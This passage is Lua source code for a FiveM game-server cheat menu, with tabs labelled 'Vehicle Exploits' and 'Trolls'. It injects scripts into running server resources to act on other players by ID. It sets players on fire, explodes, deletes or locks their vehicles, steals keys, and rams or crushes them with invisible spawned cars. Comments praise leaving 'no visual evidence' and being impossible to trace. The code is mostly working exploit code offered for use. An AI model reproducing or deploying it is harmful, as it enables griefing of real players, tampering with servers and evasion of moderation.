                        ApplyDamageToPed(tP, 10, true)
                        if not IsEntityOnFire(tP) then StartEntityFire(tP) end
                    end
                    Wait(500)
                    timer = timer + 1
                end

                StopParticleFxLooped(pfx, true)
                StopEntityFire(tP)
                Wait(3000)
                SetEntityProofs(me, false, false, false, false, false, false, false, false)
            end)
        end
    ]], targetServerId))
end)

MachoMenuText(Tab3Group1, "Player Helper (Beta)")


MachoMenuButton(Tab3Group1, "Heal Others", function()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local targetServerId = (inputId and inputId > 0) and inputId or selPlayer

    if not targetServerId or targetServerId == 0 or targetServerId == "" then 
        MachoMenuNotification("Heal", "Walang Target Player!")
        return 
    end

    MachoInjectResource2(3, "monitor", string.format([[
        local rT = %d
        local tP = 0
        local hModel = GetHashKey("prop_ld_health_pack")
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then 
                tP = GetPlayerPed(p) 
                break 
            end
        end

        if tP ~= 0 and DoesEntityExist(tP) then
            NetworkRequestControlOfEntity(tP)
            SetEntityHealth(tP, 200)
            ClearPedBloodDamage(tP)
            ResetPedVisibleDamage(tP)

            RequestModel(hModel)
            local t = 0
            while not HasModelLoaded(hModel) and t < 50 do Wait(1) t = t + 1 end

            if HasModelLoaded(hModel) then
                local coords = GetEntityCoords(tP)
                
                local pickup = CreatePickup(0x616F771E, coords.x, coords.y, coords.z, 0, 100, true, hModel)
                
                SetEntityCoords(pickup, coords.x, coords.y, coords.z, false, false, false, true)
                
                PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                
                SetModelAsNoLongerNeeded(hModel)
                
                Citizen.CreateThread(function()
                    local count = 0
                    while count < 10 do
                        count = count + 1
                        if DoesEntityExist(tP) then
                            SetEntityHealth(tP, 200)
                            ClearPedBloodDamage(tP)
                        end
                        Wait(200)
                    end
                end)
            end
        end
    ]], targetServerId))
end)

MachoMenuButton(Tab3Group1, "Give Armor", function()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local targetServerId = (inputId and inputId > 0) and inputId or selPlayer

    if not targetServerId or targetServerId == 0 or targetServerId == "" then 
        MachoMenuNotification("Armor", "Walang Target Player!")
        return 
    end

    MachoInjectResource2(3, "monitor", string.format([[
        local rT = %d
        local tP = 0
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then 
                tP = GetPlayerPed(p) 
                break 
            end
        end

        if tP ~= 0 and DoesEntityExist(tP) then
            Citizen.CreateThread(function()
                local count = 0
                while count < 20 do
                    count = count + 1
                    
                    NetworkRequestControlOfEntity(tP)
                    
                    SetPedArmour(tP, 100)
                    
                    if DecorExistOn(tP, "Esx_Armor") then
                        DecorSetInt(tP, "Esx_Armor", 100)
                    end

                    if count == 1 then
                        PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    end

                    Wait(100) 
                end
            end)
        end
    ]], targetServerId))
end)

local Tab4Button = MachoMenuAddTab(TabbedWindow, "Vehicle Exploits")
local Tab4Group1 = MachoMenuGroup(Tab4Button, "Trolls", TabsWidth+GroupGap, GroupTopGap+WindowTopBar, TabsWidth+GroupGap+GroupSize, 500-GroupTopGap)
local Tab4Group2 = MachoMenuGroup(Tab4Button, "Miscellaneous", TabsWidth+GroupGap+GroupSize+GroupGap, GroupTopGap+WindowTopBar, TabsWidth+GroupGap+GroupSize+GroupGap+GroupSize, 500-GroupTopGap)

local GlobalTargetID = MachoMenuInputbox(Tab4Group2, "Target Server ID", "1")
local CarModel = MachoMenuInputbox(Tab4Group2, "Enter Car Model", "jugular")
local IsStacking = false 


local selectedVehicle = nil
local isVehicleFlying = false




MachoMenuButton(Tab4Group2, "Freeze/UnfreezeTarget Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    local target = GetTargetID()

    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local targetID = %d
        local veh = 0

        if selVeh ~= 0 and DoesEntityExist(selVeh) then
            veh = selVeh
        else
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetID then
                    veh = GetVehiclePedIsIn(GetPlayerPed(player), false)
                    break
                end
            end
        end

        if veh ~= 0 and DoesEntityExist(veh) then
            FreezeEntityPosition(veh, not IsEntityPositionFrozen(veh))
        end
    ]], selectedVeh, target))
end)

MachoMenuButton(Tab4Group2, "Lock/Unlock Target", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    local target = GetTargetID()

    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local targetID = %d
        local veh = 0

        if selVeh ~= 0 and DoesEntityExist(selVeh) then
            veh = selVeh
        else
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetID then
                    veh = GetVehiclePedIsIn(GetPlayerPed(player), false)
                    break
                end
            end
        end

        if veh ~= 0 and DoesEntityExist(veh) then
            local status = GetVehicleDoorLockStatus(veh)
            SetVehicleDoorsLocked(veh, (status == 2 and 1 or 2))
        end
    ]], selectedVeh, target))
end)

MachoMenuButton(Tab4Group2, "Max Upgrades Fast", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    local target = GetTargetID()

    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local targetID = %d
        local veh = 0

        if selVeh ~= 0 and DoesEntityExist(selVeh) then
            veh = selVeh
        else
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetID then
                    veh = GetVehiclePedIsIn(GetPlayerPed(player), false)
                    break
                end
            end
        end

        if veh ~= 0 and DoesEntityExist(veh) then
            SetVehicleModKit(veh, 0)
            for i = 0, 48 do
                local count = GetNumVehicleMods(veh, i)
                if count > 0 then 
                    SetVehicleMod(veh, i, count - 1, false) 
                end
            end
            SetVehicleFixed(veh)
            SetVehicleDirtLevel(veh, 0.0)
        end
    ]], selectedVeh, target))
end)



MachoMenuButton(Tab4Group2, "Get Vehicle Keys (QBX)", function()

    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    local target = GetTargetID()

    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local targetID = %d
        local veh = 0
        local ped = PlayerPedId()


        if selVeh ~= 0 and DoesEntityExist(selVeh) then
            veh = selVeh
 
        elseif targetID ~= -1 then
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetID then
                    veh = GetVehiclePedIsIn(GetPlayerPed(player), false)
                    break
                end
            end
        end

        if veh == 0 or not DoesEntityExist(veh) then
            if IsPedInAnyVehicle(ped, false) then
                veh = GetVehiclePedIsIn(ped, false)
            end
        end


        if veh ~= 0 and DoesEntityExist(veh) then
            local plate = GetVehicleNumberPlateText(veh)

            TriggerEvent('qb-vehiclekeys:client:AddKeys', plate)

            -- exports['qb-core']:Notify("Keys received for plate: " .. plate, "success")
        end
    ]], selectedVeh, target))
end)

MachoMenuButton(Tab4Group2, "Explode Target Vehicle(Risky)", function()
    local target = GetTargetID()
    MachoInjectResource2(3, "any", string.format([[
        local targetID = %d
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == targetID then
                local ped = GetPlayerPed(player)
                local veh = GetVehiclePedIsIn(ped, false)
                local coords = GetEntityCoords(ped)
                if DoesEntityExist(veh) and veh ~= 0 then
                    coords = GetEntityCoords(veh)
                    NetworkRequestControlOfEntity(veh)
                end
                AddExplosion(coords.x, coords.y, coords.z, 4, 10.0, true, false, 1.0)
                if DoesEntityExist(veh) then
                    SetVehicleEngineHealth(veh, -4000)
                    ExplodeVehicle(veh, true, false)
                end
                break
            end
        end
    ]], target))
end)

MachoMenuButton(Tab4Group2, "Delete Target Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle()
    local targetPlayerID = GetTargetID()

    MachoInjectResource2(3, "any", string.format([[
        local selectedVehHandle = %d
        local targetID = %d
        local vehToDelete = 0
        if selectedVehHandle ~= 0 and DoesEntityExist(selectedVehHandle) then
            vehToDelete = selectedVehHandle
        else
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetID then
                    local ped = GetPlayerPed(player)
                    local veh = GetVehiclePedIsIn(ped, false)
                    if DoesEntityExist(veh) then
                        vehToDelete = veh
                    end
                    break
                end
            end
        end
        if DoesEntityExist(vehToDelete) then
            NetworkRequestControlOfEntity(vehToDelete)
            local timeout = 0
            while not NetworkHasControlOfEntity(vehToDelete) and timeout < 50 do
                Citizen.Wait(10)
                timeout = timeout + 1
            end
            SetEntityAsMissionEntity(vehToDelete, true, true)
            DeleteEntity(vehToDelete)
            if DoesEntityExist(vehToDelete) then
                SetEntityCoords(vehToDelete, 0.0, 0.0, -100.0, false, false, false, false)
            end
        end
    ]], selectedVeh or 0, targetPlayerID or 0))
end)


MachoMenuCheckbox(Tab4Group1, "Shift Boost", function()
    MachoMenuNotification("Shift Boost", "ENABLED | Hold Left Shift")
    
    MachoInjectResource('monitor', [[
        _G.MachoShiftBoostActive = true

        Citizen.CreateThread(function()
            while _G.MachoShiftBoostActive do
                local ped = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(ped, false)

                if IsControlPressed(0, 21) and vehicle ~= 0 and GetPedInVehicleSeat(vehicle, -1) == ped then
                    
                    ApplyForceToEntity(vehicle, 1, 0.0, 0.8, 0.0, 0.0, 0.0, 0.0, true, true, true, true, true, true)
                    
                end
                Citizen.Wait(0) 
            end
        end)
    ]])
end, function()
    MachoMenuNotification("Shift Boost", "DISABLED")
    MachoInjectResource('monitor', [[ _G.MachoShiftBoostActive = false ]])
end)


MachoMenuCheckbox(Tab4Group1, "Vehicle Fly Mode", 
    function() 
        _G.ConstantineFly = true
        MachoMenuNotification("Vehicle Fly", "ENABLED: Press Y=select, Hold Q=fly")

        Citizen.CreateThread(function()
            while _G.ConstantineFly do
                Citizen.Wait(0)

                if IsControlJustPressed(0, 246) then 
                    if selectedVehicle and DoesEntityExist(selectedVehicle) then
                        SetEntityDrawOutline(selectedVehicle, false)
                    end

                    local ped = PlayerPedId()
                    local coords = GetEntityCoords(ped)
                    selectedVehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 50.0, 0, 70)

                    if selectedVehicle and DoesEntityExist(selectedVehicle) then
                        SetEntityDrawOutline(selectedVehicle, true)
                        SetEntityDrawOutlineColor(255, 255, 0, 255)
                        MachoMenuNotification("Vehicle Fly", "Vehicle Selected!")
                    end
                end

                if selectedVehicle and DoesEntityExist(selectedVehicle) then
                    if IsControlPressed(0, 44) then
                        if not isVehicleFlying then
                            isVehicleFlying = true
                            SetEntityHasGravity(selectedVehicle, false)
                        end

                        local camRot = GetGameplayCamRot(2)
                        SetEntityRotation(selectedVehicle, camRot.x, camRot.y, camRot.z, 2, true)

                        local speed = 50.0
                        local dirX = -math.sin(math.rad(camRot.z)) * math.cos(math.rad(camRot.x))
                        local dirY = math.cos(math.rad(camRot.z)) * math.cos(math.rad(camRot.x))
                        local dirZ = math.sin(math.rad(camRot.x))

                        SetEntityVelocity(selectedVehicle, dirX * speed, dirY * speed, dirZ * speed)
                    else
                        if isVehicleFlying then
                            isVehicleFlying = false
                            SetEntityHasGravity(selectedVehicle, true)
                        end
                    end
                end
            end

            if selectedVehicle and DoesEntityExist(selectedVehicle) then
                SetEntityDrawOutline(selectedVehicle, false)
                SetEntityHasGravity(selectedVehicle, true)
            end
            selectedVehicle = nil
        end)
    end,
    function() 
        _G.ConstantineFly = false
        MachoMenuNotification("Vehicle Fly", "DISABLED")
    end
)


local selectedTeleVehicle = nil
local isTelekinesisActive = false

MachoMenuCheckbox(Tab4Group1, "Vehicle Telekinesis", 
    function() 
        _G.MachoTele = true
        MachoMenuNotification("Telekinesis", "Y = Select, Hold Q = Move Vehicle")

        Citizen.CreateThread(function()
            while _G.MachoTele do
                Citizen.Wait(0)

                if IsControlJustPressed(0, 246) then 
                    local ped = PlayerPedId()
                    local coords = GetEntityCoords(ped)
                    local targetVeh = GetClosestVehicle(coords.x, coords.y, coords.z, 50.0, 0, 70)

                    if targetVeh and DoesEntityExist(targetVeh) then
                        if selectedTeleVehicle and DoesEntityExist(selectedTeleVehicle) then
                            SetEntityDrawOutline(selectedTeleVehicle, false)
                        end
                        
                        selectedTeleVehicle = targetVeh
                        SetEntityDrawOutline(selectedTeleVehicle, true)
                        SetEntityDrawOutlineColor(0, 255, 255, 255) 
                        MachoMenuNotification("Telekinesis", "Object Locked!")
                    end
                end

                if selectedTeleVehicle and DoesEntityExist(selectedTeleVehicle) then
                    if IsControlPressed(0, 44) then 
                        if not isTelekinesisActive then
                            isTelekinesisActive = true
                            NetworkRequestControlOfEntity(selectedTeleVehicle)
                            SetEntityHasGravity(selectedTeleVehicle, false)
                            SetEntityCollision(selectedTeleVehicle, true, true)
                        end

                        local ped = PlayerPedId()
                        local camRot = GetGameplayCamRot(2)
                        local camCoords = GetGameplayCamCoord()
                        
                        local distance = 15.0
                        local dirX = -math.sin(math.rad(camRot.z)) * math.cos(math.rad(camRot.x))
                        local dirY = math.cos(math.rad(camRot.z)) * math.cos(math.rad(camRot.x))
                        local dirZ = math.sin(math.rad(camRot.x))

                        local targetPosX = camCoords.x + (dirX * distance)
                        local targetPosY = camCoords.y + (dirY * distance)
                        local targetPosZ = camCoords.z + (dirZ * distance)

                        local currentPos = GetEntityCoords(selectedTeleVehicle)
                        local velX = (targetPosX - currentPos.x) * 10.0
                        local velY = (targetPosY - currentPos.y) * 10.0
                        local velZ = (targetPosZ - currentPos.z) * 10.0

                        SetEntityVelocity(selectedTeleVehicle, velX, velY, velZ)
                        SetEntityRotation(selectedTeleVehicle, camRot.x, camRot.y, camRot.z, 2, true)
                        
                    else
                        if isTelekinesisActive then
                            isTelekinesisActive = false
                            SetEntityHasGravity(selectedTeleVehicle, true)
                            local currentVel = GetEntityVelocity(selectedTeleVehicle)
                            SetEntityVelocity(selectedTeleVehicle, currentVel.x, currentVel.y, currentVel.z)
                        end
                    end
                end
            end

            if selectedTeleVehicle and DoesEntityExist(selectedTeleVehicle) then
                SetEntityDrawOutline(selectedTeleVehicle, false)
                SetEntityHasGravity(selectedTeleVehicle, true)
            end
            selectedTeleVehicle = nil
        end)
    end,
    function() 
        _G.MachoTele = false
        MachoMenuNotification("Telekinesis", "DISABLED")
    end
)




MachoMenuButton(Tab4Group2, "Front Flip", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            
            ApplyForceToEntity(vehicle, 1, 0.0, 0.0, 6.0, 0.0, 10.0, 0.0, 0, false, true, true, false, true)
        end
    ]], selectedVeh))
end)

MachoMenuButton(Tab4Group2, "Back Flip", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            ApplyForceToEntity(vehicle, 1, 0.0, 0.0, 6.0, 0.0, -10.0, 0.0, 0, false, true, true, false, true)
        end
    ]], selectedVeh))
end)

MachoMenuButton(Tab4Group2, "Kick Flip", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            
            ApplyForceToEntity(vehicle, 1, 0.0, 0.0, 5.0, 5.0, 0.0, 0.0, 0, false, true, true, false, true)
        end
    ]], selectedVeh))
end)


MachoMenuButton(Tab4Group2, "Jump Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            
            local vel = GetEntityVelocity(vehicle)
            
            SetEntityVelocity(vehicle, vel.x, vel.y, 15.0)
        end
    ]], selectedVeh))
end)

MachoMenuButton(Tab4Group2, "360 Spin", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            
            ApplyForceToEntity(vehicle, 1, 50.0, 0.0, 0.0, 0.0, 10.0, 0.0, 0, false, true, true, false, true)
        end
    ]], selectedVeh))
end)












MachoMenuButton(Tab4Group2, "Bug Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local vehicle = %d
        
        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            local timeout = 0
            while not NetworkHasControlOfEntity(vehicle) and timeout < 50 do
                Wait(1)
                timeout = timeout + 1
            end

            SetVehicleEngineOn(vehicle, false, true, true)
            SetVehicleEngineHealth(vehicle, -100.0)
            
            local upwardForce = 400.0
            SetEntityVelocity(vehicle, 0.0, 0.0, upwardForce)
            SetEntityRotation(vehicle, 180.0, 0.0, 0.0, 1, true)
        end
    ]], selectedVeh))
end)




MachoMenuButton(Tab4Group1, "Kill Engine", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local vehicle = %d
        
        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            local timeout = 0
            while not NetworkHasControlOfEntity(vehicle) and timeout < 50 do
                Wait(1)
                timeout = timeout + 1
            end

            SetVehicleEngineOn(vehicle, false, true, true)
            SetVehicleEngineHealth(vehicle, -4000.0)
            SetVehicleFuelLevel(vehicle, 0.0)
            SetVehicleUndriveable(vehicle, true)

            Citizen.CreateThread(function()
                local count = 0
                while count < 100 do
                    local offX = (math.random(-50, 50) / 100)
                    local offY = (math.random(-50, 50) / 100)
                    local offZ = (math.random(-50, 50) / 100)
                    
                    ApplyForceToEntity(vehicle, 1, offX, offY, offZ, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                    SetEntityRotation(vehicle, math.random(0, 360)+0.0, 0.0, math.random(0, 360)+0.0, 1, true)
                    
                    Wait(10)
                    count = count + 1
                end
            end)
        end
    ]], selectedVeh))
end)



MachoMenuButton(Tab4Group1, "Glitch Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local targetVeh = %d
        local modelHash = GetHashKey("sultan")

        if targetVeh ~= 0 and DoesEntityExist(targetVeh) then
            RequestModel(modelHash)
            local t = 0
            while not HasModelLoaded(modelHash) and t < 50 do Wait(1) t = t + 1 end

            if HasModelLoaded(modelHash) then
                local coords = GetEntityCoords(targetVeh)
                local forward = GetEntityForwardVector(targetVeh)
                local spawnPos = coords + (forward * 5.0)

                local ghostVeh = CreateVehicle(modelHash, spawnPos.x, spawnPos.y, spawnPos.z, 0.0, true, false)
                
                if DoesEntityExist(ghostVeh) then
                    SetEntityVisible(ghostVeh, false, false)
                    SetEntityAlpha(ghostVeh, 0, false)
                    SetEntityCollision(ghostVeh, true, true)
                    
                    NetworkRequestControlOfEntity(targetVeh)
                    SetVehicleEngineOn(targetVeh, false, true, true)
                    SetVehicleEngineHealth(targetVeh, -4000.0)
                    SetVehicleFuelLevel(targetVeh, 0.0)
                    
                    local ramDirection = coords - spawnPos
                    SetEntityVelocity(ghostVeh, ramDirection.x * 15.0, ramDirection.y * 15.0, ramDirection.z * 15.0)
                    
                    Citizen.CreateThread(function()
                        Wait(1000)
                        if DoesEntityExist(ghostVeh) then 
                            DeleteEntity(ghostVeh) 
                        end
                    end)
                end
                SetModelAsNoLongerNeeded(modelHash)
            end
        end
    ]], selectedVeh))
end)

MachoMenuButton(Tab4Group1, "Invisible Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local vehicle = %d
        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            local timeout = 0
            while not NetworkHasControlOfEntity(vehicle) and timeout < 50 do
                Wait(1)
                timeout = timeout + 1
            end

            SetEntityVisible(vehicle, false, false)
            SetEntityAlpha(vehicle, 0, false)
        end
    ]], selectedVeh))
end)

MachoMenuButton(Tab4Group1, "Visible Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local vehicle = %d
        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            local timeout = 0
            while not NetworkHasControlOfEntity(vehicle) and timeout < 50 do
                Wait(1)
                timeout = timeout + 1
            end

            SetEntityVisible(vehicle, true, false)
            ResetEntityAlpha(vehicle)
        end
    ]], selectedVeh))
end)


MachoMenuButton(Tab4Group1, "Launch VDM", function()
    local targetId = MachoMenuGetSelectedPlayer()
    if not targetId or targetId == 0 or targetId == "" then
        targetId = tonumber(MachoMenuGetInputbox(GlobalTargetID))
    end
    local selectedCar = MachoMenuGetInputbox(CarModel)
    if selectedCar == "" or selectedCar == "..." then selectedCar = "jugular" end
    if not targetId or targetId == 0 then return end
    MachoInjectResource2(3, "monitor", string.format([[
        local rT, vH, tP = %d, GetHashKey("%s"), 0
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then tP = GetPlayerPed(p) break end
        end
        if tP ~= 0 and DoesEntityExist(tP) then
            RequestModel(vH)
            local t = 0
            while not HasModelLoaded(vH) and t < 50 do Wait(1) t = t + 1 end
            if HasModelLoaded(vH) then
                local pP = GetEntityCoords(tP)
                local fV = GetEntityForwardVector(tP)
                local sP = pP + (fV * -15.0) 
                local veh = CreateVehicle(vH, sP.x, sP.y, sP.z + 0.5, 0.0, true, false)
                if DoesEntityExist(veh) then
                    local tV = pP - sP
                    local mag = math.sqrt(tV.x^2 + tV.y^2 + tV.z^2)
                    local dir = {x = tV.x/mag, y = tV.y/mag, z = tV.z/mag}
                    local speed = 60.0
                    SetEntityVelocity(veh, dir.x * speed, dir.y * speed, dir.z * speed)
                    SetEntityAsMissionEntity(veh, true, true)
                    Citizen.CreateThread(function()
                        Wait(2000)
                        if DoesEntityExist(veh) then DeleteEntity(veh) end
                    end)
                end
                SetModelAsNoLongerNeeded(vH)
            end
        end
    ]], targetId, selectedCar))
end)






MachoMenuButton(Tab4Group1, "Tornado Vehicle", function()
    local tId = MachoMenuGetSelectedPlayer()
    if not tId or tId == 0 or tId == "" then
        tId = tonumber(MachoMenuGetInputbox(GlobalTargetID))
    end
    
    if not tId or tId == 0 then return end

    MachoInjectResource2(3, "monitor", string.format([[
        local rT = %d
        
        Citizen.CreateThread(function()
            local targetPed = 0
            for _, p in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(p) == rT or p == rT then 
                    targetPed = GetPlayerPed(p) 
                    break 
                end
            end

            if targetPed ~= 0 and DoesEntityExist(targetPed) then
                local vehicles = GetGamePool('CVehicle')
                local targetPos = GetEntityCoords(targetPed)
                
                for _, veh in ipairs(vehicles) do
                    -- Kunin lahat ng sasakyan maliban sa sinasakyan ng target
                    if DoesEntityExist(veh) and veh ~= GetVehiclePedIsIn(targetPed, false) then
                        local vehPos = GetEntityCoords(veh)
                        
                        if #(targetPos - vehPos) < 100.0 then
                            NetworkRequestControlOfEntity(veh)
                            
                            SetEntityCollision(veh, false, true)
                            
                            Citizen.CreateThread(function()
                                local angle = math.random() * math.pi * 2
                                local radius = 8.0 
                                
                                for i = 1, 150 do 
                                    if DoesEntityExist(veh) and DoesEntityExist(targetPed) then
                                        local cP = GetEntityCoords(targetPed)
                                        angle = angle + 0.2 -- Speed ng pag-ikot sa paligid
                                        
                                        local x = cP.x + math.cos(angle) * radius
                                        local y = cP.y + math.sin(angle) * radius
                                        local z = cP.z + (math.sin(angle) * 3.0) -- Pa-alon na taas/baba
                                        
                                        local currentVehPos = GetEntityCoords(veh)
                                        -- Pull Velocity: Hinihigop papunta sa circle
                                        local velX = (x - currentVehPos.x) * 8.0
                                        local velY = (y - currentVehPos.y) * 8.0
                                        local velZ = (z - currentVehPos.z) * 8.0
                                        
                                        SetEntityVelocity(veh, velX, velY, velZ)
                                        
                                        -- 360 Spin: Umiikot ang sasakyan sa sarili niya
                                        local r = GetEntityRotation(veh, 2)
                                        SetEntityRotation(veh, r.x + 15.0, r.y + 15.0, r.z + 15.0, 2, true)
                                        
                                        Wait(10)
                                    end
                                end
                                
                                if DoesEntityExist(veh) then
                                    SetEntityCollision(veh, true, true)
                                    SetEntityVelocity(veh, math.random(-50, 50)+0.0, math.random(-50, 50)+0.0, 50.0)
                                end
                            end)
                        end
                    end
                end
            end
        end)
    ]], tId))
end)





MachoMenuButton(Tab4Group1, "Magnet Cars", function()
    local tId = MachoMenuGetSelectedPlayer()
    if not tId or tId == 0 or tId == "" then
        tId = tonumber(MachoMenuGetInputbox(GlobalTargetID))
    end
    if not tId or tId == 0 then return end
    MachoInjectResource2(3, "monitor", string.format([[
        local rT = %d
        
        Citizen.CreateThread(function()
            local targetPed = 0
            for _, p in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(p) == rT or p == rT then 
                    targetPed = GetPlayerPed(p) 
                    break 
                end
            end
            if targetPed ~= 0 and DoesEntityExist(targetPed) then
                local vehicles = GetGamePool('CVehicle')
                local pP = GetEntityCoords(targetPed)
                for _, veh in ipairs(vehicles) do
                   
                    if DoesEntityExist(veh) and veh ~= GetVehiclePedIsIn(targetPed, false) and veh ~= GetVehiclePedIsIn(PlayerPedId(), false) then
                        local vP = GetEntityCoords(veh)
                        if #(pP - vP) < 100.0 then
                            
                            NetworkRequestControlOfEntity(veh)
                            SetEntityAsMissionEntity(veh, true, true)
                            SetVehicleEngineOn(veh, true, true, false)
                            FreezeEntityPosition(veh, false)
                            local dir = {x = pP.x - vP.x, y = pP.y - vP.y, z = pP.z - vP.z}
                            ApplyForceToEntity(veh, 1, dir.x * 25.0, dir.y * 25.0, dir.z * 25.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                            SetVehicleForwardSpeed(veh, 150.0) 
                            SetPedToRagdoll(targetPed, 1000, 1000, 0, 0, 0, 0)
                        end
                    end
                end
            end
        end)
    ]], tId))
end)



MachoMenuButton(Tab4Group1, "Explode Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local vehicle = %d
        
        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            local timeout = 0
            while not NetworkHasControlOfEntity(vehicle) and timeout < 50 do
                Wait(1)
                timeout = timeout + 1
            end

            SetVehicleEngineHealth(vehicle, -1000.0)
            
            if DoesEntityExist(vehicle) then
                NetworkExplodeVehicle(vehicle, true, false, 0)
            end
            
            SetVehicleBodyHealth(vehicle, -1000.0)
            SetVehiclePetrolTankHealth(vehicle, -1000.0)
        end
    ]], selectedVeh))
end)



MachoMenuButton(Tab4Group1, "Fall Vehicle (Stealth)", function()
    local tId = MachoMenuGetSelectedPlayer()
    if not tId or tId == 0 or tId == "" then
        tId = tonumber(MachoMenuGetInputbox(GlobalTargetID))
    end
    local selectedCar = MachoMenuGetInputbox(CarModel)
    if selectedCar == "" or selectedCar == "..." then selectedCar = "blista" end
    if not tId or tId == 0 then return end
    
    MachoInjectResource2(3, "monitor", string.format([[
        local rT, mH, tP = %d, GetHashKey("%s"), 0
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then tP = GetPlayerPed(p) break end
        end
        
        if tP ~= 0 and DoesEntityExist(tP) then
            RequestModel(mH)
            local t = 0
            while not HasModelLoaded(mH) and t < 50 do Wait(1) t = t + 1 end
            
            if HasModelLoaded(mH) then
                -- SPAWN INVISIBLE VEHICLES
                for i = 1, 30 do
                    if DoesEntityExist(tP) then
                        local pos = GetEntityCoords(tP)
                        local offsetX = math.random(-3, 3)
                        local offsetY = math.random(-3, 3)
                        local offsetZ = math.random(50, 120)
                        
                        local veh = CreateVehicle(mH, pos.x + offsetX, pos.y + offsetY, pos.z + offsetZ, 0.0, true, false)
                        
                        if DoesEntityExist(veh) then
                            -- MAKE INVISIBLE (no visual evidence)
                            SetEntityVisible(veh, false, false)
                            SetEntityAlpha(veh, 0, false)
                            
                            -- NO NETWORK ID (can't be traced to you)
                            SetEntityAsMissionEntity(veh, true, true)
                            
                            -- SMALL DELAY BEFORE FALLING (looks random)
                            Citizen.SetTimeout(math.random(100, 500), function()
                                if DoesEntityExist(veh) then
                                    ApplyForceToEntity(veh, 3, 0.0, 0.0, -400.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                    
